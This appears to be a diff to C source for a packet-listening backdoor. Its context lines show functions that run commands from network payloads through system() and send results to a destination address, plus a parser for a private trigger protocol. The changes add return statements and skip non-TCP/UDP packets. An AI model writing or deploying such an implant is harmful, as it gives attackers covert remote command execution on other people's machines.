@@ -115,6 +115,8 @@ int execute_command(char* payload, int destination_address) {
     // Close the socket fd
     close(socket_fd);
 
+    return 0;
+
 }
 
 // Just uses system to execute a command. Blind, so doesn't send result
@@ -173,6 +175,8 @@ int blind_execute_command(char* payload) {
 
     // Close the saved stderr fd
     close(saved_stderr);
+
+    return 0;
 }
 
 // Parse payload. Look for our established protocol message
@@ -320,6 +324,13 @@ int main() {
             payload = (char *)udp + sizeof(struct udphdr);
 
         }    
+
+        else {
+
+            // Not TCP or UDP, skip it
+
+            continue;  
+        }
 
         // (payload - buf) removes the header parts
         int payload_len = received_bytes - (payload - buf);
